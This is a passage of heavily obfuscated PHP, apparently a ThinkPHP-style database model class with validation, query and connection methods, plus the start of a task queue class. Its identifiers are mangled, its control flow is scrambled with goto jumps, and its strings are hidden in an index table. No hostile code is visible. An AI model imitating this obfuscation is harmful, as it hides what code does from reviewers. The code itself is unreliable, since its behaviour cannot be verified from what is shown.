(is_object($bßÙëˆò¥Ñ)) { $bßÙëˆò¥Ñ = get_object_vars($bßÙëˆò¥Ñ); } if (empty($bßÙëˆò¥Ñ) || !is_array($bßÙëˆò¥Ñ)) { $this->error = think_lang($E¤»áƒØºÂ[268]); return !1; } goto CÜ¯¢êÄèÛ; B²ßàî±ùÓ: return $bßÙëˆò¥Ñ; goto dîù¶ºöÖ‡; B¬âô¶İ’¤: if ($this->autoCheckFields) { $EÍæœ«¹× = $this->getDbFields(); foreach ($bßÙëˆò¥Ñ as $FâŞ¢Ã…ëÂ => $F‡«´‡´) { if (!in_array($FâŞ¢Ã…ëÂ, $EÍæœ«¹×)) { unset($bßÙëˆò¥Ñ[$FâŞ¢Ã…ëÂ]); } elseif (MAGIC_QUOTES_GPC && is_string($F‡«´‡´)) { $bßÙëˆò¥Ñ[$FâŞ¢Ã…ëÂ] = stripslashes($F‡«´‡´); } } } $this->autoOperation($bßÙëˆò¥Ñ, $AÅöÃƒ–ƒ); $this->data = $bßÙëˆò¥Ñ; goto B²ßàî±ùÓ; CÜ¯¢êÄèÛ: $bßÙëˆò¥Ñ = $this->parseFieldsMap($bßÙëˆò¥Ñ, 0); $AÅöÃƒ–ƒ = $AÅöÃƒ–ƒ ? $AÅöÃƒ–ƒ : (!empty($bßÙëˆò¥Ñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$E¤»áƒØºÂ[270]])) { $EÍæœ«¹× = $this->options[$E¤»áƒØºÂ[270]]; unset($this->options[$E¤»áƒØºÂ[270]]); } elseif ($AÅöÃƒ–ƒ == THINK_MODEL_INSERT && isset($this->insertFields)) { $EÍæœ«¹× = $this->insertFields; } elseif ($AÅöÃƒ–ƒ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $EÍæœ«¹× = $this->updateFields; } goto D·È²ÅÊŒ›; dîù¶ºöÖ‡: } public function autoCheckToken($Aá¤Œêå‡») { $f½ÎŒ‚©Ü„ =& $_SERVER[´¬]; if (isset($this->options[$f½ÎŒ‚©Ü„[298]]) && !$this->options[$f½ÎŒ‚©Ü„[298]]) { return !0; } if (think_config($f½ÎŒ‚©Ü„[295])) { $cµÀ‡ËÒğñ = think_config($f½ÎŒ‚©Ü„[296]); if (!isset($Aá¤Œêå‡»[$cµÀ‡ËÒğñ]) || Session::get($cµÀ‡ËÒğñ)) { return !1; } list($aÈ®•õ•–¾, $dÀŒ¬­‘¸Ä) = explode($f½ÎŒ‚©Ü„[71], $Aá¤Œêå‡»[$cµÀ‡ËÒğñ]); if ($dÀŒ¬­‘¸Ä && Session::get($cµÀ‡ËÒğñ . $f½ÎŒ‚©Ü„[95] . $aÈ®•õ•–¾) === $dÀŒ¬­‘¸Ä) { Session::remove($cµÀ‡ËÒğñ . $f½ÎŒ‚©Ü„[95] . $aÈ®•õ•–¾); return !0; } if (think_config($f½ÎŒ‚©Ü„[299])) { Session::remove($cµÀ‡ËÒğñ . $f½ÎŒ‚©Ü„[95] . $aÈ®•õ•–¾); } return !1; } return !0; } public function regex($AÏŸõˆ°Ñ, $FßåÀ”É—¬) { $BÇÀØË£Ï =& $_SERVER[´¬]; $d ï¸¾¶õé = array($BÇÀØË£Ï[300] => $BÇÀØË£Ï[301], $BÇÀØË£Ï[302] => $BÇÀØË£Ï[303], $BÇÀØË£Ï[304] => $BÇÀØË£Ï[305], $BÇÀØË£Ï[306] => $BÇÀØË£Ï[307], $BÇÀØË£Ï[308] => $BÇÀØË£Ï[309], $BÇÀØË£Ï[310] => $BÇÀØË£Ï[311], $BÇÀØË£Ï[312] => $BÇÀØË£Ï[313], $BÇÀØË£Ï[287] => $BÇÀØË£Ï[314], $BÇÀØË£Ï[315] => $BÇÀØË£Ï[316]); if (isset($d ï¸¾¶õé[strtolower($FßåÀ”É—¬)])) { $FßåÀ”É—¬ = $d ï¸¾¶õé[strtolower($FßåÀ”É—¬)]; } return preg_match($FßåÀ”É—¬, $AÏŸõˆ°Ñ) === 1; } private function autoOperation(&$C©¯„ë¾ì–, $C­¢ïºÑ«Ï) { $eÒğÀ¶…‡ =& $_SERVER[´¬]; if (!empty($this->options[$eÒğÀ¶…‡[317]])) { $C¦ÖÔ½Æõê = $this->options[$eÒğÀ¶…‡[317]]; unset($this->options[$eÒğÀ¶…‡[317]]); } elseif (!empty($this->_auto)) { $C¦ÖÔ½Æõê = $this->_auto; } if (isset($C¦ÖÔ½Æõê)) { foreach ($C¦ÖÔ½Æõê as $FÄ’Èô­‚) { if (empty($FÄ’Èô­‚[2])) { $FÄ’Èô­‚[2] = THINK_MODEL_INSERT; } if ($C­¢ïºÑ«Ï == $FÄ’Èô­‚[2] || $FÄ’Èô­‚[2] == THINK_MODEL_BOTH) { switch (trim($FÄ’Èô­‚[3])) { case $eÒğÀ¶…‡[318]: case $eÒğÀ¶…‡[319]: $aÄ‡À¸ù× = isset($FÄ’Èô­‚[4]) ? (array) $FÄ’Èô­‚[4] : array(); if (isset($C©¯„ë¾ì–[$FÄ’Èô­‚[0]])) { array_unshift($aÄ‡À¸ù×, $C©¯„ë¾ì–[$FÄ’Èô­‚[0]]); } if ($eÒğÀ¶…‡[318] == $FÄ’Èô­‚[3]) { $C©¯„ë¾ì–[$FÄ’Èô­‚[0]] = call_user_func_array($FÄ’Èô­‚[1], $aÄ‡À¸ù×); } else { $C©¯„ë¾ì–[$FÄ’Èô­‚[0]] = call_user_func_array(array(&$this, $FÄ’Èô­‚[1]), $aÄ‡À¸ù×); } break; case $eÒğÀ¶…‡[270]: $C©¯„ë¾ì–[$FÄ’Èô­‚[0]] = $C©¯„ë¾ì–[$FÄ’Èô­‚[1]]; break; case $eÒğÀ¶…‡[320]: if ($eÒğÀ¶…‡[33] === $C©¯„ë¾ì–[$FÄ’Èô­‚[0]]) { unset($C©¯„ë¾ì–[$FÄ’Èô­‚[0]]); } break; case $eÒğÀ¶…‡[321]: default: $C©¯„ë¾ì–[$FÄ’Èô­‚[0]] = $FÄ’Èô­‚[1]; } if (!1 === $C©¯„ë¾ì–[$FÄ’Èô­‚[0]]) { unset($C©¯„ë¾ì–[$FÄ’Èô­‚[0]]); } } } } return $C©¯„ë¾ì–; } protected function autoValidation($bÍñ®­¶¦˜, $a‚ôÕÎòò—) { $A„šœ‡êğ =& $_SERVER[´¬]; if (!empty($this->options[$A„šœ‡êğ[322]])) { $CØšÍ–»‰µ = $this->options[$A„šœ‡êğ[322]]; unset($this->options[$A„šœ‡êğ[322]]); } elseif (!empty($this->_validate)) { $CØšÍ–»‰µ = $this->_validate; } if (isset($CØšÍ–»‰µ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($CØšÍ–»‰µ as $B„ºöêÌõ => $cÂÓÆ¯¨é) { if (empty($cÂÓÆ¯¨é[5]) || $cÂÓÆ¯¨é[5] == THINK_MODEL_BOTH || $cÂÓÆ¯¨é[5] == $a‚ôÕÎòò—) { if (0 == strpos($cÂÓÆ¯¨é[2], $A„šœ‡êğ[323]) && strpos($cÂÓÆ¯¨é[2], $A„šœ‡êğ[324])) { $cÂÓÆ¯¨é[2] = think_lang(substr($cÂÓÆ¯¨é[2], 2, -1)); } $cÂÓÆ¯¨é[3] = isset($cÂÓÆ¯¨é[3]) ? $cÂÓÆ¯¨é[3] : THINK_EXISTS_VALIDATE; $cÂÓÆ¯¨é[4] = isset($cÂÓÆ¯¨é[4]) ? $cÂÓÆ¯¨é[4] : $A„šœ‡êğ[325]; switch ($cÂÓÆ¯¨é[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bÍñ®­¶¦˜, $cÂÓÆ¯¨é)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($A„šœ‡êğ[33] != trim($bÍñ®­¶¦˜[$cÂÓÆ¯¨é[0]])) { if (!1 === $this->_validationField($bÍñ®­¶¦˜, $cÂÓÆ¯¨é)) { return !1; } } break; default: if (isset($bÍñ®­¶¦˜[$cÂÓÆ¯¨é[0]])) { if (!1 === $this->_validationField($bÍñ®­¶¦˜, $cÂÓÆ¯¨é)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($a«ÛÆî­, $dóàÛ«¸¥Ì) { if (!1 === $this->_validationFieldItem($a«ÛÆî­, $dóàÛ«¸¥Ì)) { if ($this->patchValidate) { $this->error[$dóàÛ«¸¥Ì[0]] = $dóàÛ«¸¥Ì[2]; } else { $this->error = $dóàÛ«¸¥Ì[2]; return !1; } } return; } protected function _validationFieldItem($EÃ¶‘‡ï£, $DÕ–Ë„Ğç) { $a·±…ç‹Å‹ =& $_SERVER[´¬]; switch (strtolower(trim($DÕ–Ë„Ğç[4]))) { case $a·±…ç‹Å‹[318]: case $a·±…ç‹Å‹[319]: $f¦ªÎ¸ä»… = isset($DÕ–Ë„Ğç[6]) ? (array) $DÕ–Ë„Ğç[6] : array(); if (is_string($DÕ–Ë„Ğç[0]) && strpos($DÕ–Ë„Ğç[0], $a·±…ç‹Å‹[47])) { $DÕ–Ë„Ğç[0] = explode($a·±…ç‹Å‹[47], $DÕ–Ë„Ğç[0]); } if (is_array($DÕ–Ë„Ğç[0])) { foreach ($DÕ–Ë„Ğç[0] as $cÛÖà‚“È®) { $e·¬ğˆ¨Ğ¹[$cÛÖà‚“È®] = $EÃ¶‘‡ï£[$cÛÖà‚“È®]; } array_unshift($f¦ªÎ¸ä»…, $e·¬ğˆ¨Ğ¹); } else { array_unshift($f¦ªÎ¸ä»…, $EÃ¶‘‡ï£[$DÕ–Ë„Ğç[0]]); } if ($a·±…ç‹Å‹[318] == $DÕ–Ë„Ğç[4]) { return call_user_func_array($DÕ–Ë„Ğç[1], $f¦ªÎ¸ä»…); } else { return call_user_func_array(array(&$this, $DÕ–Ë„Ğç[1]), $f¦ªÎ¸ä»…); } case $a·±…ç‹Å‹[326]: return $EÃ¶‘‡ï£[$DÕ–Ë„Ğç[0]] == $EÃ¶‘‡ï£[$DÕ–Ë„Ğç[1]]; case $a·±…ç‹Å‹[327]: if (is_string($DÕ–Ë„Ğç[0]) && strpos($DÕ–Ë„Ğç[0], $a·±…ç‹Å‹[47])) { $DÕ–Ë„Ğç[0] = explode($a·±…ç‹Å‹[47], $DÕ–Ë„Ğç[0]); } $BÜ¸ŠÈ³é« = array(); if (is_array($DÕ–Ë„Ğç[0])) { foreach ($DÕ–Ë„Ğç[0] as $cÛÖà‚“È®) { $BÜ¸ŠÈ³é«[$cÛÖà‚“È®] = $EÃ¶‘‡ï£[$cÛÖà‚“È®]; } } else { $BÜ¸ŠÈ³é«[$DÕ–Ë„Ğç[0]] = $EÃ¶‘‡ï£[$DÕ–Ë„Ğç[0]]; } if (!empty($EÃ¶‘‡ï£[$this->getPk()])) { $BÜ¸ŠÈ³é«[$this->getPk()] = array($a·±…ç‹Å‹[328], $EÃ¶‘‡ï£[$this->getPk()]); } if ($this->where($BÜ¸ŠÈ³é«)->find()) { return !1; } return !0; default: return $this->check($EÃ¶‘‡ï£[$DÕ–Ë„Ğç[0]], $DÕ–Ë„Ğç[1], $DÕ–Ë„Ğç[4]); } } public function check($e ‘Şë˜Î, $AÅ×«ñ‹í, $CËäĞÅÂéå = "\x72\x65\147\x65\170") { $b‚½­¢”ÈÊ =& $_SERVER[´¬]; $CËäĞÅÂéå = strtolower(trim($CËäĞÅÂéå)); switch ($CËäĞÅÂéå) { case $b‚½­¢”ÈÊ[7]: case $b‚½­¢”ÈÊ[329]: $bÏëâ¹Ó‰ = is_array($AÅ×«ñ‹í) ? $AÅ×«ñ‹í : explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í); return $CËäĞÅÂéå == $b‚½­¢”ÈÊ[7] ? in_array($e ‘Şë˜Î, $bÏëâ¹Ó‰) : !in_array($e ‘Şë˜Î, $bÏëâ¹Ó‰); case $b‚½­¢”ÈÊ[330]: case $b‚½­¢”ÈÊ[331]: if (is_array($AÅ×«ñ‹í)) { $C¤ÏÀ»˜¶Š = $AÅ×«ñ‹í[0]; $AŠÈŞÁ½ = $AÅ×«ñ‹í[1]; } else { list($C¤ÏÀ»˜¶Š, $AŠÈŞÁ½) = explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í); } return $CËäĞÅÂéå == $b‚½­¢”ÈÊ[330] ? $e ‘Şë˜Î >= $C¤ÏÀ»˜¶Š && $e ‘Şë˜Î <= $AŠÈŞÁ½ : $e ‘Şë˜Î < $C¤ÏÀ»˜¶Š || $e ‘Şë˜Î > $AŠÈŞÁ½; case $b‚½­¢”ÈÊ[332]: case $b‚½­¢”ÈÊ[333]: return $CËäĞÅÂéå == $b‚½­¢”ÈÊ[332] ? $e ‘Şë˜Î == $AÅ×«ñ‹í : $e ‘Şë˜Î != $AÅ×«ñ‹í; case $b‚½­¢”ÈÊ[334]: $aÚáÆà³ÔÅ = mb_strlen($e ‘Şë˜Î, $b‚½­¢”ÈÊ[335]); if (strpos($AÅ×«ñ‹í, $b‚½­¢”ÈÊ[47])) { list($C¤ÏÀ»˜¶Š, $AŠÈŞÁ½) = explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í); return $aÚáÆà³ÔÅ >= $C¤ÏÀ»˜¶Š && $aÚáÆà³ÔÅ <= $AŠÈŞÁ½; } else { return $aÚáÆà³ÔÅ == $AÅ×«ñ‹í; } case $b‚½­¢”ÈÊ[336]: list($BÌ¾‰Ì›æÑ, $e—Ï„»èá) = explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í); if (!is_numeric($BÌ¾‰Ì›æÑ)) { $BÌ¾‰Ì›æÑ = strtotime($BÌ¾‰Ì›æÑ); } if (!is_numeric($e—Ï„»èá)) { $e—Ï„»èá = strtotime($e—Ï„»èá); } return NOW_TIME >= $BÌ¾‰Ì›æÑ && NOW_TIME <= $e—Ï„»èá; case $b‚½­¢”ÈÊ[337]: return in_array(get_client_ip(), explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í)); case $b‚½­¢”ÈÊ[338]: return !in_array(get_client_ip(), explode($b‚½­¢”ÈÊ[47], $AÅ×«ñ‹í)); case $b‚½­¢”ÈÊ[325]: default: return $this->regex($e ‘Şë˜Î, $AÅ×«ñ‹í); } } public function query($A¿ºäá¾, $Aİ–µ†šÕÀ = false) { $e¾ìÄÜÙŞİ =& $_SERVER[´¬]; if (!is_bool($Aİ–µ†šÕÀ) && !is_array($Aİ–µ†šÕÀ)) { $Aİ–µ†šÕÀ = func_get_args(); array_shift($Aİ–µ†šÕÀ); } $A¿ºäá¾ = str_replace(array($e¾ìÄÜÙŞİ[228], $e¾ìÄÜÙŞİ[339]), $e¾ìÄÜÙŞİ[50], $A¿ºäá¾); $A¿ºäá¾ = $this->parseSql($A¿ºäá¾, $Aİ–µ†šÕÀ); return $this->db->query($A¿ºäá¾); } public function execute($EŒ©ÀÁ…£ , $CÎ–¯îÏƒ· = false) { if (!is_bool($CÎ–¯îÏƒ·) && !is_array($CÎ–¯îÏƒ·)) { $CÎ–¯îÏƒ· = func_get_args(); array_shift($CÎ–¯îÏƒ·); } $EŒ©ÀÁ…£  = $this->parseSql($EŒ©ÀÁ…£ , $CÎ–¯îÏƒ·); return $this->db->execute($EŒ©ÀÁ…£ ); } protected function parseSql($AÈ¸ÍÁ÷ˆÎ, $D¹ëÒ´ñš‡) { $EÚµë‡Î´ =& $_SERVER[´¬]; if (!0 === $D¹ëÒ´ñš‡) { $bÔ­óœ¡²Ë = $this->_parseOptions(); $AÈ¸ÍÁ÷ˆÎ = $this->db->parseSql($AÈ¸ÍÁ÷ˆÎ, $bÔ­óœ¡²Ë); } elseif (is_array($D¹ëÒ´ñš‡)) { $D¹ëÒ´ñš‡ = array_map(array($this->db, $EÚµë‡Î´[340]), $D¹ëÒ´ñš‡); $AÈ¸ÍÁ÷ˆÎ = vsprintf($AÈ¸ÍÁ÷ˆÎ, $D¹ëÒ´ñš‡); } else { $AÈ¸ÍÁ÷ˆÎ = strtr($AÈ¸ÍÁ÷ˆÎ, array($EÚµë‡Î´[341] => $this->getTableName(), $EÚµë‡Î´[342] => think_config($EÚµë‡Î´[241]))); } $this->db->setModel($this->name); return $AÈ¸ÍÁ÷ˆÎ; } public function db($EêÁ¼‚ = '', $d‰ÛçÑ‘ìÜ = '', $a²Úîá‚¾ = array()) { goto aˆŞÍ´×‹ª; F·¼°‘«·Å: static $aŞçğÙÃ˜ç = array(); if (!isset($aŞçğÙÃ˜ç[$EêÁ¼‚]) || isset($aŞçğÙÃ˜ç[$EêÁ¼‚]) && $d‰ÛçÑ‘ìÜ && $a¢ô“¶ùäŠ[$EêÁ¼‚] != $d‰ÛçÑ‘ìÜ) { if (!empty($d‰ÛçÑ‘ìÜ) && is_string($d‰ÛçÑ‘ìÜ) && !1 === strpos($d‰ÛçÑ‘ìÜ, $b„ĞÇ”Œè‹[8])) { $d‰ÛçÑ‘ìÜ = think_config($d‰ÛçÑ‘ìÜ); } $aŞçğÙÃ˜ç[$EêÁ¼‚] = Db::getInstance($d‰ÛçÑ‘ìÜ); } elseif (NULL === $d‰ÛçÑ‘ìÜ) { $aŞçğÙÃ˜ç[$EêÁ¼‚]->close(); unset($aŞçğÙÃ˜ç[$EêÁ¼‚]); return; } if (!empty($a²Úîá‚¾)) { if (is_string($a²Úîá‚¾)) { parse_str($a²Úîá‚¾, $a²Úîá‚¾); } foreach ($a²Úîá‚¾ as $C¿™ë¨…¢‚ => $d¨íæµàÏ‹) { $this->setProperty($C¿™ë¨…¢‚, $d¨íæµàÏ‹); } } goto DøÁà»êìÓ; Cƒ¨ò«Ãí: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto cÄÕÀ„¾ğì; DøÁà»êìÓ: $a¢ô“¶ùäŠ[$EêÁ¼‚] = $d‰ÛçÑ‘ìÜ; $this->db = $aŞçğÙÃ˜ç[$EêÁ¼‚]; $this->_after_db(); goto Cƒ¨ò«Ãí; aˆŞÍ´×‹ª: $b„ĞÇ”Œè‹ =& $_SERVER[´¬]; if ($b„ĞÇ”Œè‹[33] === $EêÁ¼‚ && $this->db) { return $this->db; } static $a¢ô“¶ùäŠ = array(); goto F·¼°‘«·Å; cÄÕÀ„¾ğì: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $dŸ†õ˜¸Ú° = get_class($this); if ($dŸ†õ˜¸Ú° == $_SERVER[´¬][343]) { return $this->name; } $this->name = substr($dŸ†õ˜¸Ú°, 0, -5); } return $this->name; } public function getTableName() { $FÅÁ°éî¸ =& $_SERVER[´¬]; if (empty($this->trueTableName)) { $a­õÔğ˜Â‡ = !empty($this->tablePrefix) ? $this->tablePrefix : $FÅÁ°éî¸[33]; if (!empty($this->tableName)) { $a­õÔğ˜Â‡ .= $this->tableName; } else { $a­õÔğ˜Â‡ .= think_parse_name($this->name); } $this->trueTableName = strtolower($a­õÔğ˜Â‡); } return (!empty($this->dbName) ? $this->dbName . $FÅÁ°éî¸[95] : $FÅÁ°éî¸[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $eª¨àóÛõù =& $_SERVER[´¬]; return isset($this->fields[$eª¨àóÛõù[248]]) ? $this->fields[$eª¨àóÛõù[248]] : $this->pk; } public function getDbFields() { $B¦¢ÀÅ„ğÅ =& $_SERVER[´¬]; if (isset($this->options[$B¦¢ÀÅ„ğÅ[276]])) { $d¨¦‹—ğŠõ = $this->db->getFields($this->options[$B¦¢ÀÅ„ğÅ[276]]); return $d¨¦‹—ğŠõ ? array_keys($d¨¦‹—ğŠõ) : !1; } if ($this->fields) { $d¨¦‹—ğŠõ = $this->fields; unset($d¨¦‹—ğŠõ[$B¦¢ÀÅ„ğÅ[247]], $d¨¦‹—ğŠõ[$B¦¢ÀÅ„ğÅ[248]], $d¨¦‹—ğŠõ[$B¦¢ÀÅ„ğÅ[249]], $d¨¦‹—ğŠõ[$B¦¢ÀÅ„ğÅ[246]]); return $d¨¦‹—ğŠõ; } return !1; } public function data($cÆÑšÜˆ¦ã = '') { $eš§¢Š¬µ =& $_SERVER[´¬]; if ($eš§¢Š¬µ[33] === $cÆÑšÜˆ¦ã && !empty($this->data)) { return $this->data; } if (is_object($cÆÑšÜˆ¦ã)) { $cÆÑšÜˆ¦ã = get_object_vars($cÆÑšÜˆ¦ã); } elseif (is_string($cÆÑšÜˆ¦ã)) { parse_str($cÆÑšÜˆ¦ã, $cÆÑšÜˆ¦ã); } elseif (!is_array($cÆÑšÜˆ¦ã)) { think_exception(think_lang($eš§¢Š¬µ[268])); } $this->data = $cÆÑšÜˆ¦ã; return $this; } public function join($f’ƒšùßœĞ) { $C‘„Â‘È =& $_SERVER[´¬]; if (is_array($f’ƒšùßœĞ)) { $this->options[$C‘„Â‘È[279]] = $f’ƒšùßœĞ; } elseif (!empty($f’ƒšùßœĞ)) { $this->options[$C‘„Â‘È[279]][] = $f’ƒšùßœĞ; } return $this; } public function union($CÀóÛ‚ëÚ¸, $Fì˜ïä•—˜ = false) { goto a„«Âø¯àë; eßÓœ´ãÄù: return $this; goto bçã›º³¿¬; a„«Âø¯àë: $eî¡Õö¿ =& $_SERVER[´¬]; if (empty($CÀóÛ‚ëÚ¸)) { return $this; } if ($Fì˜ïä•—˜) { $this->options[$eî¡Õö¿[344]][$eî¡Õö¿[345]] = !0; } goto aç©ˆøùÌâ; aç©ˆøùÌâ: if (is_object($CÀóÛ‚ëÚ¸)) { $CÀóÛ‚ëÚ¸ = get_object_vars($CÀóÛ‚ëÚ¸); } if (is_string($CÀóÛ‚ëÚ¸)) { $E´„–õ‡ÉÄ = $CÀóÛ‚ëÚ¸; } elseif (is_array($CÀóÛ‚ëÚ¸)) { if (isset($CÀóÛ‚ëÚ¸[0])) { $this->options[$eî¡Õö¿[344]] = array_merge($this->options[$eî¡Õö¿[344]], $CÀóÛ‚ëÚ¸); return $this; } else { $E´„–õ‡ÉÄ = $CÀóÛ‚ëÚ¸; } } else { think_exception(think_lang($eî¡Õö¿[268])); } $this->options[$eî¡Õö¿[344]][] = $E´„–õ‡ÉÄ; goto eßÓœ´ãÄù; bçã›º³¿¬: } public function cache($f”Ÿƒ¶ñà¾ = true, $Aõ—ä‚Ì = null, $eò”˜«›ğ‚ = '') { $FÊèäñ˜çÑ =& $_SERVER[´¬]; if (!1 !== $f”Ÿƒ¶ñà¾) { $this->options[$FÊèäñ˜çÑ[346]] = array($FÊèäñ˜çÑ[93] => $f”Ÿƒ¶ñà¾, $FÊèäñ˜çÑ[336] => $Aõ—ä‚Ì, $FÊèäñ˜çÑ[29] => $eò”˜«›ğ‚); } return $this; } public function field($A»–²òå‡ø, $BÅ¾ğïÕÇª = false) { $b…«ÆÛ¤Î­ =& $_SERVER[´¬]; if (!0 === $A»–²òå‡ø) { $C‡”ó¥‰´£ = $this->getDbFields(); $A»–²òå‡ø = $C‡”ó¥‰´£ ? $C‡”ó¥‰´£ : $b…«ÆÛ¤Î­[182]; } elseif ($BÅ¾ğïÕÇª) { if (is_string($A»–²òå‡ø)) { $A»–²òå‡ø = explode($b…«ÆÛ¤Î­[47], $A»–²òå‡ø); } $C‡”ó¥‰´£ = $this->getDbFields(); $A»–²òå‡ø = $C‡”ó¥‰´£ ? array_diff($C‡”ó¥‰´£, $A»–²òå‡ø) : $A»–²òå‡ø; } $this->options[$b…«ÆÛ¤Î­[270]] = $A»–²òå‡ø; return $this; } public function scope($Aî·ó˜´©Í = '', $bœ‰ŞÍìÑ = NULL) { $b„‰÷êåË =& $_SERVER[´¬]; if ($b„‰÷êåË[33] === $Aî·ó˜´©Í) { if (isset($this->_scope[$b„‰÷êåË[34]])) { $a“í·î‹”ï = $this->_scope[$b„‰÷êåË[34]]; } else { return $this; } } elseif (is_string($Aî·ó˜´©Í)) { $b•×³Ÿíá„ = explode($b„‰÷êåË[47], $Aî·ó˜´©Í); $a“í·î‹”ï = array(); foreach ($b•×³Ÿíá„ as $E¨×ÎÌ£Òô) { if (!isset($this->_scope[$E¨×ÎÌ£Òô])) { continue; } $a“í·î‹”ï = array_merge($a“í·î‹”ï, $this->_scope[$E¨×ÎÌ£Òô]); } if (!empty($bœ‰ŞÍìÑ) && is_array($bœ‰ŞÍìÑ)) { $a“í·î‹”ï = array_merge($a“í·î‹”ï, $bœ‰ŞÍìÑ); } } elseif (is_array($Aî·ó˜´©Í)) { $a“í·î‹”ï = $Aî·ó˜´©Í; } if (is_array($a“í·î‹”ï) && !empty($a“í·î‹”ï)) { $this->options = array_merge($this->options, array_change_key_case($a“í·î‹”ï)); } return $this; } public function where($F–ää¨âÑè, $C±ø—Àè = null) { $E¹¡˜Œ÷ =& $_SERVER[´¬]; if (!is_null($C±ø—Àè) && is_string($F–ää¨âÑè)) { if (!is_array($C±ø—Àè)) { $C±ø—Àè = func_get_args(); array_shift($C±ø—Àè); } $C±ø—Àè = array_map(array($this->db, $E¹¡˜Œ÷[340]), $C±ø—Àè); $F–ää¨âÑè = vsprintf($F–ää¨âÑè, $C±ø—Àè); } elseif (is_object($F–ää¨âÑè)) { $F–ää¨âÑè = get_object_vars($F–ää¨âÑè); } elseif (is_array($F–ää¨âÑè)) { foreach ($F–ää¨âÑè as $E½ğ—à„ğÄ => $D•ÇášÕ) { if ((is_numeric($E½ğ—à„ğÄ) || !$E½ğ—à„ğÄ) && is_string($D•ÇášÕ)) { if (strpos($D•ÇášÕ, $E¹¡˜Œ÷[347]) === 0) { continue; } think_trace($E¹¡˜Œ÷[348], $E¹¡˜Œ÷[33], $E¹¡˜Œ÷[46]); die; } } } if (is_string($F–ää¨âÑè) && $E¹¡˜Œ÷[33] != $F–ää¨âÑè) { $C®´Æ®ÇÈ½ = array(); $C®´Æ®ÇÈ½[$E¹¡˜Œ÷[349]] = $F–ää¨âÑè; $F–ää¨âÑè = $C®´Æ®ÇÈ½; } if (isset($this->options[$E¹¡˜Œ÷[272]])) { $this->options[$E¹¡˜Œ÷[272]] = array_merge($this->options[$E¹¡˜Œ÷[272]], $F–ää¨âÑè); } else { $this->options[$E¹¡˜Œ÷[272]] = $F–ää¨âÑè; } return $this; } public function limit($CÉ—½Œª´À, $AáÅÚË•¥ = null) { $eâŞ´ºëÑö =& $_SERVER[´¬]; $this->options[$eâŞ´ºëÑö[289]] = is_null($AáÅÚË•¥) ? $CÉ—½Œª´À : $CÉ—½Œª´À . $eâŞ´ºëÑö[47] . $AáÅÚË•¥; return $this; } public function page($a†Ì“†…Û, $A¬‡¢©ˆ„ = null) { $F½èƒÕÊà† =& $_SERVER[´¬]; $this->options[$F½èƒÕÊà†[350]] = is_null($A¬‡¢©ˆ„) ? $a†Ì“†…Û : $a†Ì“†…Û . $F½èƒÕÊà†[47] . $A¬‡¢©ˆ„; return $this; } public function comment($aÈ’Š¡‚Š) { $this->options[$_SERVER[´¬][351]] = $aÈ’Š¡‚Š; return $this; } public function setProperty($b—áà­ãå, $CÅÏšáêß) { if (property_exists($this, $b—áà­ãå)) { $this->{$b—áà­ãå} = $CÅÏšáêß; } return $this; } } goto e¡ÍŞß¢Ï; d­Í¤¼”: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\x65\x75\145\x4c\145\156\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\165\x65\x75\145\x44\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($Dá¬†¾», $f¶ÀôŸ‘ = array(), $DÏ’°¬²ºã = '', $Aß”£®ˆáŒ = '') { $eö‚öã’¼Ó =& $_SERVER[´¬]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Aß”£®ˆáŒ && array_find_by_field(self::$listData, $eö‚öã’¼Ó[93], $Aß”£®ˆáŒ)) { return !0; } self::$listData[] = array($eö‚öã’¼Ó[261] => $Dá¬†¾», $eö‚öã’¼Ó[1595] => $f¶ÀôŸ‘, $eö‚öã’¼Ó[429] => $DÏ’°¬²ºã, $eö‚öã’¼Ó[93] => $Aß”£®ˆáŒ); return !0; } public static function addSubmit() { $fŒª‡¢Ø’ï =& $_SERVER[´¬]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($fŒª‡¢Ø’ï[1596] . json_encode_force(array_to_keyvalue(self::$listData, $fŒª‡¢Ø’ï[33], $fŒª‡¢Ø’ï[429])), $fŒª‡¢Ø’ï[1597]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($f‘ĞŠ‘Ş±™, $Díİà’…Š = array(), $a„È£ãÀ£‘ = '', $b•ƒµ¼š‡Ï = '') { goto Bß«¼¥ÓØ; Bß«¼¥ÓØ: $e ¢ÖÍ±Ñ =& $_SERVER[´¬]; if (self::count() >= self::MAX_LENGTH) { return !1; } $f×Íø™éÀ– = self::getAll(); goto CŒùì‰·÷; d³ì‘ò›·ù: self::setAll($f×Íø™éÀ–); return !0; goto CãÙã‹À; CŒùì‰·÷: if ($b•ƒµ¼š‡Ï && array_find_by_field($f×Íø™éÀ–, $e ¢ÖÍ±Ñ[93], $b•ƒµ¼š‡Ï)) { return !0; } $f×Íø™éÀ–[] = array($e ¢ÖÍ±Ñ[261] => $f‘ĞŠ‘Ş±™, $e ¢ÖÍ±Ñ[1595] => $Díİà’…Š, $e ¢ÖÍ±Ñ[429] => $a„È£ãÀ£‘, $e ¢ÖÍ±Ñ[93] => $b•ƒµ¼š‡Ï); write_log($e ¢ÖÍ±Ñ[1596] . $a„È£ãÀ£‘, $e 